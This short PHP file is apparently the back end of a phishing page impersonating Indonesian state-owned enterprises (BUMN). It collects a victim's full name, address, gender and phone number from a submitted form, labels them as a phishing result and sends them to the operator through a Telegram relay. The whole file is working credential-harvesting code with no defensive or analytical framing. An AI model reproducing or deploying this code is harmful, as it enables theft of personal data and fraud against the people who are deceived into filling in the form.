<?php

session_start();

include "./telegram.php";

$fullname = $_POST['fullname'];
$address = $_POST['address'];
$gender = $_POST['gender'];
$phoneNumber = $_POST['phoneNumber'];

$string = "== Result Phising BUMN ==\n";
$string .= "Fullname : `$fullname`\n";
$string .= "Address : `$address`\n";
$string .= "Gender : `$gender`\n";
$string .= "Phone : `$phoneNumber`\n";

$_SESSION['message'] = $string;

sendTelegram($string);
